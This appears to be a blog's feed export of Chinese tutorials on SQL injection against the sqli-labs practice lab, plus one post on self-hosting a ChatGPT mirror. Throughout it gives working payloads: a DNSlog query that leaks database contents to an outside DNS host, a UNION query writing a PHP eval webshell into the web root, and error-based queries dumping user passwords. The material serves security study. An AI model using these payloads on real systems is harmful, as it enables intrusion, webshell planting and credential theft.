        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（10）：POST注入</title>
      <link href="/2023/04/22/SQL%E6%B3%A8%E5%85%A5%EF%BC%8810%EF%BC%89%EF%BC%9APOST%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/04/22/SQL%E6%B3%A8%E5%85%A5%EF%BC%8810%EF%BC%89%EF%BC%9APOST%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="post提交注入">POST提交注入</h2><p>POST提交注入有别于我们之前的注入方式，我们之前的注入方式都采用了GET请求的方式，而POST提交注入是使用POST请求的方式进行尝试注入。</p><h3 id="post提交-get提交对比">POST提交、GET提交对比</h3><ul><li><p>get提交可以被缓存，post提交不会</p><p>在浏览器地址栏、历史记录、书签都可以保存GET提交</p></li><li><p>get提交有长度限制，最长2048个字符；</p><p>post提交没有长度要求，不是只允许使用ASCII字符，还可以使用二进制数据</p></li></ul><h3 id="post提交演示">POST提交演示</h3><p>这里我们使用less-11进行演示，并使用burpsuite进行抓包演示</p><img src="https://image.icewindy.cn/202304282346059.png" alt="image-20230428234628954" style="zoom: 50%;" /><p>我们可以发现，在内容区存在三个参数uname、passwd和submit。这三个参数就是我们刚刚提交的登录操作，我们可以选择放行Forward或丢弃Drop，这里我们选择放行。发现出现登录失败的提示。</p><img src="https://image.icewindy.cn/202304282347552.png" alt="image-20230428234720489" style="zoom:67%;" /><p>一般来说，登陆的场景都是通过POST的方式提交的。</p><h3 id="联合注入">联合注入</h3><p>我们在前面抓包分析后，发现提交的参数有三个，我们可以在hackbar添加Post data尝试我们之前GET提交熟悉的的流程，对网站注入点进行测试</p><ul><li><p>判断注入点闭合，并注释后面语句</p><img src="https://image.icewindy.cn/202304290016917.png" alt="image-20230429001620832" style="zoom: 50%;" /></li><li><p>group by二分法判断查询列数。发现无报错列数不符即可</p><img src="https://image.icewindy.cn/202304290019136.png" alt="image-20230429001934053" style="zoom:50%;" /></li><li><p>把uname修改为不存在数字或为空（我这里已经是不存在的），测试联合查询</p><img src="https://image.icewindy.cn/202304290022996.png" alt="image-20230429002235928" style="zoom:50%;" /></li><li><p>依次拿到靶机数据库名（可直接database()）、表名、列名</p><p>表名</p><img src="https://image.icewindy.cn/202304290025662.png" alt="image-20230429002530619" style="zoom:67%;" /><p>列名</p><img src="https://image.icewindy.cn/202304290027327.png" alt="image-20230429002709272" style="zoom:67%;" /></li><li><p>拿取最终目标</p><img src="https://image.icewindy.cn/202304290029629.png" alt="image-20230429002940565" style="zoom: 50%;" /></li></ul><p>对于其他注入方式来说，流程上和方法上大致都无差异，最大差异在于把<code>--+</code>替换成<code>#</code>作注释掉后续代码。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（9）：DNSlog注入</title>
      <link href="/2023/04/17/SQL%E6%B3%A8%E5%85%A5%EF%BC%889%EF%BC%89%EF%BC%9ADNSlog%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/04/17/SQL%E6%B3%A8%E5%85%A5%EF%BC%889%EF%BC%89%EF%BC%9ADNSlog%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="dnslog注入">DNSlog注入</h2><p>DNSlog注入实际上是属于盲注的一种，但是比盲注效率高一点。</p><p>在一定的情况下，如果我们想对一个网站使用布尔或时间盲注，手动注入会对WAF的绕过会非常有帮助，但是效率不高，因此我们往往会使用SQLmap等工具注入，但是这种工具对很多网站都有限制。这时候就该尝试DNSlog注入。</p><p>这种注入方式，相较于布尔或时间盲注而言，好处在于可以一组一组进行测试，不用再一个一个字符进行逐以测试，比其他两个盲注效率要高，但是要求服务器的读写权限都要对MySQL开启，如果没有开启的话，是不能使用这种注入方式的。</p><h3 id="关键函数">关键函数</h3><ul><li><p><code>load_file(&quot;[路径]&quot;)</code>：用于读取某个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:\\test.txt&quot;);</span><br></pre></td></tr></table></figure><p>可以读取出文件，并且获取到一共多少个字节。</p><p>除了可以读取本机路径以外还可以读取到网络上的路径，即可以使用UNC路径。</p></li><li><p>UNC路径</p><p>格式：<code>\servername\sharename</code>，其中</p><ul><li>servername是服务器名，可以是域名或者是IP地址</li><li>sharename是共享资源的名称</li></ul><p>利用UNC路径能解析网络路径的特性</p></li></ul><h3 id="利用方式">利用方式</h3><p><img src="https://image.icewindy.cn/202304190011587.jpeg" alt="img"></p><p>而这里我们常常用到的DNSlog服务网站为</p><ul><li><p><a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p>使用方法：打开后，选择<code>get subdomain</code>获取一个dns服务器，接着我们尝试在浏览器打开随机一段字符串+获取到的dns服务器，例如<code>text.d3158r.dnslog.cn</code>，点击Refresh Record，即可获取到解析记录</p><img src="https://image.icewindy.cn/202304190027101.png" alt="image-20230419002710065" style="zoom:80%;" /></li><li><p><a href="https://dig.pm/">https://dig.pm/</a></p></li></ul><p>简而言之，注入过程就是让目标数据库去解析域名，然后在解析域名之前，执行一段查询语句，并加入到解析域名中，DNS记录下的解析记录即为查询结果。</p><h3 id="实例">实例</h3><p>由于dnslog.cn时不时无法访问，<a href="http://xn--dig-hb0er53olq7a23c.pm">这里使用dig.pm</a></p><p>我们还是继续用到Less-9。先判断出闭合方式为<code>'</code>，具体判断流程不再赘述。由于load_file函数中，参数是被双引号闭合起来的，因此我们需要用到concat来拼接字符串，不能直接在load_file中使用，以下是一个错误示范：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.181/sqli/less-9/?id=1&#x27; and (select load_file(//(select database()).f899e19f.ipv6.1433.eu.org/text.txt))) --+</span><br></pre></td></tr></table></figure><p>正确的注入语句构造方式应该是将<code>//</code>、查询的内容、和后面dns服务器的部分拼接起来，这样才能让查询的内容执行完，再放入load_file中执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.181/sqli/less-9/?id=1&#x27; and (select load_file(concat(&quot;//&quot;,(select database()),&quot;.f899e19f.ipv6.1433.eu.org/text.txt&quot;))) --+</span><br></pre></td></tr></table></figure><p>然后在dig.pm中获取解析记录</p><p><img src="https://image.icewindy.cn/202304190057458.png" alt="image-20230419005719436"></p><p>发现已经有了结果。然后更具体的注入获取流程，请参考前面的笔记的过程，不再作出赘述。</p><h3 id="自动化注入利用">自动化注入利用</h3><p>DnslogSqlinj：<a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p><p>首先需要安装依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip2 install gevent==1.2.2</span><br><span class="line">pip2 install termcolor</span><br></pre></td></tr></table></figure><p>然后我们需要修改配置文件，在ceye.io获取APItoken和DNSurl后，修改config.py中的APItoken和DNSurl。接着我们根据github上的提示即可自动化DNSlog注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage: dnslogSql.py [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#x27;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -n TASKNAME, --name=TASKNAME</span><br><span class="line">                        task name</span><br><span class="line">  -t THREAD_COUNT, --thread=THREAD_COUNT</span><br><span class="line">                        thread_count</span><br><span class="line">  -u URL, --url=URL     target include injection</span><br><span class="line">  -i INF, --inf=INF     Testing target and Try to get information</span><br><span class="line">  --dbs                 get database</span><br><span class="line">  -D DB                 database name</span><br><span class="line">  --tables              get table</span><br><span class="line">  -T TABLE              table name</span><br><span class="line">  --columns             get column</span><br><span class="line">  -C COLUMN             column name</span><br><span class="line">  --dump                get data</span><br></pre></td></tr></table></figure><p>（ceye.io不清楚为什么进不去，能进去之后再进一步展示使用方法）</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（8）：sql注入文件上传</title>
      <link href="/2023/04/12/SQL%E6%B3%A8%E5%85%A5%EF%BC%888%EF%BC%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/04/12/SQL%E6%B3%A8%E5%85%A5%EF%BC%888%EF%BC%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p>除了在页面查询数据库内容外，SQL注入还有另外一种利用方式：利用MySQL在服务器的写权限，上传我们的文件，以达到拿到Web Shell的目的。</p><h2 id="要点">要点</h2><ul><li><p><code>show variables like '%secure%';</code>：用于查看MySQl是否具有读写文件的权限</p><p>查询返回的<code>secure_file_priv</code>有三种状态：</p><ul><li>空          ——对于整个硬盘数据都可以读写</li><li>特定路径——只能在指定路径下面读写</li><li>NULL     ——不能在服务器上进行任何读写</li></ul></li><li><p><code>into outfile</code>：写入服务器文件；例如<code>into outfile &quot;D:\\phpstudy_pro\\WWW\\test.php&quot;</code>，<code>D:\\phpstudy_pro\\WWW\\</code>为文件写入的目录，<code>test.php</code>为新写入的文件名。</p></li><li><p>一句话木马：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;password&#x27;])?&gt;</span><br></pre></td></tr></table></figure><p>password为预留的密码。</p></li></ul><h2 id="less-7">Less-7</h2><p>直接进行实际例子展示。首先是判断字符型还是数字型注入</p><img src="https://image.icewindy.cn/202304132328487.png" alt="image-20230413232824463" style="zoom:80%;" /><p>简单判断得出为字符型。接下来判断闭合方式，具体判断过程可以参考上一篇文章</p><img src="https://image.icewindy.cn/202304132350005.png" alt="image-20230413235038982" style="zoom:80%;" /><p>测试列数，测试得出<code>group by 3</code>，即三列。</p><p>结合上面要点提到的文件上传和一句话木马构建拿取Web Shell命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;password&#x27;])?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\test.php&quot; --+</span><br></pre></td></tr></table></figure><p>这样我们就可以把一句话木马注入到服务器中。</p><p><img src="https://image.icewindy.cn/202304140108131.png" alt="image-20230414010837114"></p><p>然后使用一句话木马利用工具（蚁剑等）就可以成功拿取服务器权限了。</p><img src="https://image.icewindy.cn/202304140125065.png" alt="image-20230414012546998" style="zoom: 50%;" />]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（7）：布尔盲注、时间盲注</title>
      <link href="/2023/04/12/SQL%E6%B3%A8%E5%85%A5%EF%BC%887%EF%BC%89%EF%BC%9A%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/04/12/SQL%E6%B3%A8%E5%85%A5%EF%BC%887%EF%BC%89%EF%BC%9A%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="盲注">盲注</h2><p>页面没有错误回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行SQL注入被称为盲注。常见的盲注的分类有三种</p><ul><li>布尔盲注</li><li>时间盲注</li><li>报错盲注</li></ul><p>使用盲注的情况该为如下情况</p><ol><li>页面没有回显位</li><li>页面没有报错</li></ol><h2 id="布尔盲注">布尔盲注</h2><p>而且使用布尔盲注的情况除了需要满足前面两种情况外，还需要满足页面会返回真假两种状态。布尔注入就是利用页面返回不同，逐个猜解数据。</p><p>什么叫真假状态呢？</p><h3 id="真假状态">真假状态</h3><p>真假状态指的就是页面只有查询成功和查询不成功两种界面，没有别的回显示。</p><p>如下例子</p><img src="https://image.icewindy.cn/202304120113511.png" alt="image-20230412011301475" style="zoom:80%;" /><img src="https://image.icewindy.cn/202304120112079.png" alt="image-20230412011248055" style="zoom:80%;" /><p>在这个例子中，页面只有查询到和查询不到两种结果，即使是第二种能使得查询报错的用法也只能让页面没有任何回显。</p><p>而布尔盲注就是利用页面返回的不同，逐个猜解数据。由于布尔盲注工作量比较大，往往的我们都是使用自动化工具去完成操作，手动注入并不多，学习的目的是为了如果碰到网站真实存在这种注入，但需要我们手动注入来尝试绕过对方WAF再编写自动化工具注入的情况。</p><h3 id="布尔盲注的条件">布尔盲注的条件</h3><p>一般而言，我们可以尝试<code>1=1</code>和<code>1=2</code>来判断页面是否存在注入的条件</p><p>页面为真：</p><img src="https://image.icewindy.cn/202304120121409.png" alt="image-20230412012101381" style="zoom:80%;" /><p>页面为假：</p><img src="https://image.icewindy.cn/202304120121790.png" alt="image-20230412012127770" style="zoom:80%;" /><p>一旦判断得到页面存在真假两种情况，就可以使用布尔盲注</p><h3 id="关键函数">关键函数</h3><ul><li><p><code>ascii()</code>将字母、字符转换为ascii码；方便我们进行将结果转换成数字进行大小比大小的一个比较，以此来利用页面真假值。可以利用大于<code>&gt;</code>等比较符进行二分法猜解。</p></li><li><p><code>substr([字符串],start,num)</code>将[字符串]从第<code>start</code>个字符，提取<code>num</code>个字符；由于ascii()只能转换一个字符，因此用于配合ascii()逐个字符猜出查询内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select database()),1,1) &gt; 100</span><br></pre></td></tr></table></figure><p>配合<code>limit start,num</code>来限定查询的行数</p></li><li><p><code>limit start,num</code>从第<code>start</code>行开始，显示<code>num</code>行</p></li></ul><h3 id="注入方式">注入方式</h3><p>通常使用二分法，逐一猜解查询结果。一般我们都是通过编写脚本的方式来进行猜解。很少会使用手工注入的方式利用布尔盲注。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(&#x27;abcd&#x27;,1,1))&gt;100 --+</span><br></pre></td></tr></table></figure><p>将abcd转换为查询语句即可。若有多行返回结果的查询，使用<code>limit 0,1</code>进行限定返回的行数。</p><h3 id="闭合符判断">闭合符判断</h3><p>由于布尔盲注只有真假两种情况，因此我们需要逐一尝试闭合方式。例如less-7</p><ol><li><p>尝试<code>'</code>闭合：直接报错，排除</p><img src="https://image.icewindy.cn/202304132344532.png" alt="image-20230413234431508" style="zoom: 80%;" /></li><li><p>尝试<code>&quot;</code>闭合，回显为真；使用<code>and 1=2</code>判断是否为真闭合，结果为真，证明为假闭合</p><img src="https://image.icewindy.cn/202304132347939.png" alt="image-20230413234711918" style="zoom:80%;" /><img src="https://image.icewindy.cn/202304132347866.png" alt="image-20230413234731840" style="zoom:80%;" /></li><li><p>尝试<code>')</code>闭合，直接报错，排除</p></li><li><p>尝试<code>'))</code>闭合，回显为真；使用<code>and 1=2</code>判断是否为真闭合，报错，证明<code>'))</code>为闭合方式</p><img src="https://image.icewindy.cn/202304132349234.png" alt="image-20230413234933209" style="zoom:80%;" /></li></ol><h2 id="时间盲注">时间盲注</h2><h3 id="使用条件">使用条件</h3><p>Web页面只返回一个正常页面。利用页面响应事件不同，逐个猜解数据。</p><p>（前提是数据库会执行命令代码，只是不反馈页面信息）</p><h3 id="关键函数">关键函数</h3><ul><li><p><code>sleep()</code>：参数为休眠的时长，以秒为单位。作用是让数据库查询后延迟几秒返回。</p><p>利用方式：是否延迟返回页面可以判断是否执行成功。</p></li><li><p><code>if()</code>：参数有三个<code>condition,true,false</code>，分别是判断条件、条件为真时返回的值、条件为假时返回的值</p><p>利用方式：<code>select if(1=1, sleep(0), sleep(3))</code>1=1为真，休眠0s</p></li></ul><h3 id="注入方式">注入方式</h3><p>时间盲注和布尔注入非常相似，只不过布尔注入是通过页面真假值判断，而时间注入是通过返回的时间进行判断猜解正确与否。</p><p>举一个查询语句的例子就很好理解我们的注入方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(ascii(substr((select database),1,1))&gt;100, sleep(0), sleep(3));</span><br></pre></td></tr></table></figure><p>同样是逐一猜字母判断，使用二分法进行猜解，只不过猜解<code>正确与否</code>从<code>页面是否有回显</code>变成了<code>页面是否延迟返回</code>。</p><p>查看页面响应时间长度可以在<code>开发者工具-&gt;网络</code>里面查看到响应时间长短。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建ChatGPT镜像站</title>
      <link href="/2023/04/11/%E6%90%AD%E5%BB%BAChatGPT%E9%95%9C%E5%83%8F%E7%AB%99/"/>
      <url>/2023/04/11/%E6%90%AD%E5%BB%BAChatGPT%E9%95%9C%E5%83%8F%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h2 id="需要准备的东西">需要准备的东西</h2><ul><li><p>一个ChatGPT帐号</p><p>如果没有帐号，请参考https://mirror.xyz/0x6E12A28086548B11dfcc20c75440E0B3c10721f5/9O9CSqyKDj4BKUIil7NC1Sa1LJM-3hsPqaeW_QjfFBc</p></li><li><p>一台服务器</p></li><li><p>所使用的项目地址：<a href="https://github.com/Chanzhaoyu/chatgpt-web">https://github.com/Chanzhaoyu/chatgpt-web</a></p></li></ul><h2 id="使用docker部署教程">使用Docker部署教程</h2><p>为了便利部署，这里使用docker进行部署。</p><p>在服务器上使用docker拉取<code>chatgpt-web</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull chenzhaoyu94/chatgpt-web</span><br></pre></td></tr></table></figure><p>登录ChatGPT帐号后，打开https://chat.openai.com/api/auth/session</p><p>打开后会有一串JSON字符串，找到<code>&quot;accessToken&quot;:</code>，将后面双引号的内容复制下来。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name chatgpt-web -d -p 3002:3002 --env OPENAI_ACCESS_TOKEN=[刚刚复制的内容] chatgpt-web</span><br></pre></td></tr></table></figure><p>然后从外网使用<code>[你的ip]:3002</code>即可访问你的镜像站。</p><h3 id="可以使用的环境参数">可以使用的环境参数</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二选一</span></span><br><span class="line">OPENAI_API_KEY: sk-xxx</span><br><span class="line"><span class="comment"># 二选一</span></span><br><span class="line">OPENAI_ACCESS_TOKEN: xxx</span><br><span class="line"><span class="comment"># API接口地址，可选，设置 OPENAI_API_KEY 时可用</span></span><br><span class="line">OPENAI_API_BASE_URL: xxx</span><br><span class="line"><span class="comment"># API模型，可选，设置 OPENAI_API_KEY 时可用，https://platform.openai.com/docs/models</span></span><br><span class="line"><span class="comment"># gpt-4, gpt-4-0314, gpt-4-32k, gpt-4-32k-0314, gpt-3.5-turbo, gpt-3.5-turbo-0301, text-davinci-003, text-davinci-002, code-davinci-002</span></span><br><span class="line">OPENAI_API_MODEL: xxx</span><br><span class="line"><span class="comment"># 反向代理，可选</span></span><br><span class="line">API_REVERSE_PROXY: xxx</span><br><span class="line"><span class="comment"># 访问权限密钥，可选</span></span><br><span class="line">AUTH_SECRET_KEY: xxx</span><br><span class="line"><span class="comment"># 每小时最大请求次数，可选，默认无限</span></span><br><span class="line">MAX_REQUEST_PER_HOUR: <span class="number">0</span></span><br><span class="line"><span class="comment"># 超时，单位毫秒，可选</span></span><br><span class="line">TIMEOUT_MS: <span class="number">60000</span></span><br><span class="line"><span class="comment"># Socks代理，可选，和 SOCKS_PROXY_PORT 一起时生效</span></span><br><span class="line">SOCKS_PROXY_HOST: xxx</span><br><span class="line"><span class="comment"># Socks代理端口，可选，和 SOCKS_PROXY_HOST 一起时生效</span></span><br><span class="line">SOCKS_PROXY_PORT: xxx</span><br><span class="line"><span class="comment"># HTTPS 代理，可选，支持 http，https，socks5</span></span><br><span class="line">HTTPS_PROXY: http://xxx:<span class="number">7890</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 小服务搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（6）：floor报错</title>
      <link href="/2023/04/10/SQL%E6%B3%A8%E5%85%A5%EF%BC%886%EF%BC%89%EF%BC%9Afloor%E6%8A%A5%E9%94%99/"/>
      <url>/2023/04/10/SQL%E6%B3%A8%E5%85%A5%EF%BC%886%EF%BC%89%EF%BC%9Afloor%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<h2 id="涉及到的函数">涉及到的函数</h2><ul><li>rand()函数：随机返回0～1之间的小数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure><p>计算结果在0～1之间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand()*2;</span><br></pre></td></tr></table></figure><p>计算结果在0～2之间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand() from users;</span><br></pre></td></tr></table></figure><p>根据表users的行数随机显示结果</p><img src="https://image.icewindy.cn/202304101722772.png" alt="image-20230410172210731" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand(num);</span><br></pre></td></tr></table></figure><p>将数字num作为种子生成随机数，将可能产生相同的随机数</p><ul><li>floor()函数：小数向下取整数。ceiling()：向上取整数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2);</span><br></pre></td></tr></table></figure><p>结果随机为0或者1</p><ul><li>concat_ws()：将括号内数据用第一个字段连接起来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;-&#x27;, (select database()), floor(rand()*2)) from users;</span><br></pre></td></tr></table></figure><img src="https://image.icewindy.cn/202304101734955.png" alt="image-20230410173406925" style="zoom:67%;" /><ul><li>group by：分组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;-&#x27;, (select database()), floor(rand()*2)) as a from users group by a;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202304101736782.png" alt="image-20230410173649755"></p><ul><li>count()：汇总统计数量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;-&#x27;, (select database()), floor(rand()*2)) as a from users group by a;</span><br></pre></td></tr></table></figure><p>利用这个命令我们可以统计分组后各自的总数</p><img src="https://image.icewindy.cn/202304101740700.png" alt="image-20230410174042678" style="zoom:80%;" /><p><strong>但是</strong>，这个命令偶尔会报错</p><p><img src="https://image.icewindy.cn/202304101739264.png" alt="image-20230410173926239"></p><p>这里会出现我们的查询结果<code>security-1</code>，这个结果如果我们替换成我们需要的结果，就可以成功达到注入的效果。为了稳定触发这个报错，我们需要了解这个报错的触发原因。</p><ul><li>limit：用于显示指定行数</li></ul><h2 id="报错触发原理">报错触发原理</h2><p>报错的原因在于统计分组的时候，分组的名字即<code>security-1</code>、<code>security-2</code>发生了重复，导致了报错。</p><p>导致这个报错的真正原因在于：**rand函数在进行分组group by和统计count时可能会多次执行，导致键值key重复。**如何理解这句话呢？我们来阐述一下这整个统计过程</p><ol><li><code>floor(rand()*2)</code>产生了一列随机数</li><li>使用concat_ws进行拼接</li><li>group by和count进行统计数量，逐一统计计数</li></ol><p>问题出现在统计记数这个过程中：</p><p>统计时发现key值不存在时，会<strong>重新计算</strong><code>concat_ws('-', (select database()), floor(rand(0)*2)) </code>再填入key内。</p><ul><li>假设第一次rand得到的是<code>security-1</code>，发现不存在，然后重新计算得到<code>security-1</code>填入key的空位；</li><li>第二次我们rand得到了<code>security-0</code>，发现也不存在，然后重新计算得到<code>security-1</code>，但是<strong>仍然会填入key的空位中</strong></li></ul><p>这就导致了在统计表中出现了两个<code>security-1</code>的key，就导致了报错。</p><p>有了原理，我们就可以根据原理来稳定使得其报错。使用<code>rand(num)</code>得到不随机的随机数，然后尝试出稳定报错的<code>num</code>，再次构造上面的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;-&#x27;, (select database()), floor(rand(0)*2)) as a from users group by a;</span><br></pre></td></tr></table></figure><p><code>from users</code>的作用是产生足够多次的计算。在注入时，一般会使用行数比较多的默认数据表<code>information_schema.tables</code></p><p>这样就得到稳定能够报错的语句，到现在为止，我们只需要修改<code>(select database())</code>，改成我们需要的语句就可以利用报错注入SQL了。</p><h2 id="例子less-5">例子Less-5</h2><p>对于例子5，我们就直接构造出语句即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;, (select concat(&#x27;~&#x27;,id,username,&#x27;:&#x27;,password) from users limit 0,1), floor(rand(0)*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p>利用<code>limit 0,1</code>可以将数据逐行显示在错误内</p><img src="https://image.icewindy.cn/202304102247655.png" alt="image-20230410224752631" style="zoom:80%;" />]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（5）：extractValue、updateXml报错注入</title>
      <link href="/2023/04/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%885%EF%BC%89%EF%BC%9AextractValue%E3%80%81updateXml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/04/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%885%EF%BC%89%EF%BC%9AextractValue%E3%80%81updateXml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="报错注入">报错注入</h2><p>首先报错注入需要一个基础</p><p><img src="https://image.icewindy.cn/202304062126010.png" alt="image-20230406212644828"></p><p><strong>报错注入</strong>就是：</p><p>构造语句，让错误信息中夹杂可以显示数据库内容的查询语句。</p><p>该注入方式常见于没有回显结果的，但是注入点输错结果会报错的的情况。例如Less-5</p><img src="https://image.icewindy.cn/202304062140027.png" alt="image-20230406214058004" style="zoom: 67%;" /><img src="https://image.icewindy.cn/202304062141792.png" alt="image-20230406214123768" style="zoom:67%;" /><p>但是我们通过这个报错又可以获取到数据库库名叫<code>security</code>。通过这个逻辑注入的方式就被称之为报错注入。</p><p>报错注入分为12种</p><img src="https://image.icewindy.cn/202304062154085.png" alt="image-20230406215431914" style="zoom: 50%;" /><p>常见的报错注入为前三种：</p><ul><li>floor()报错注入</li><li>extractValue()报错注入</li><li>updataXml()报错注入</li></ul><p>其中第二和第三种原理基本一致，只是函数的内容不太一样。</p><h2 id="extractvalue-报错注入">extractValue()报错注入</h2><h3 id="extractvalue-函数">extractValue()函数</h3><p>函数extractValue()包含两个参数</p><ul><li>第一个参数为XML文档对象名称</li><li>第二个参数为路径</li></ul><p>该函数用于查询数据库内XML文档对象的内容。而updateXml()则是用于更新XML文档内容。</p><p>使用例：</p><p><img src="https://image.icewindy.cn/202304062241765.png" 